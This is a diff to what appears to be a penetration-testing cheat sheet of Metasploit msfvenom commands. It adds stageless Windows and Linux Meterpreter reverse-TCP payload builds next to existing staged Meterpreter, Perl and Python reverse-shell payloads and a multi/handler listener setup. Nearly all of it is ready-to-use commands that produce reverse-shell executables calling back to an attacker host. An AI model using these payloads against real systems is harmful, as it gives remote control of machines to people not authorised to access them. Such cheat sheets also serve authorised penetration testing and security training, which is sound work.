@@ -104,9 +104,13 @@ msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw -o [.pl | .cgi]
 # python
 msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw -o kshell.py
 
-# meterpreter
+# meterpreter staged
 msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > kshell.elf
+
+# meterpreter stageless
+msfvenom -p windows/meterpreter_reverse_tcp LHOST= LPORT= -f exe -o kshell.exe
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST= LPORT= -f elf > kshell.elf
 
 # msf Shell listener
 use exploit/multi/handler
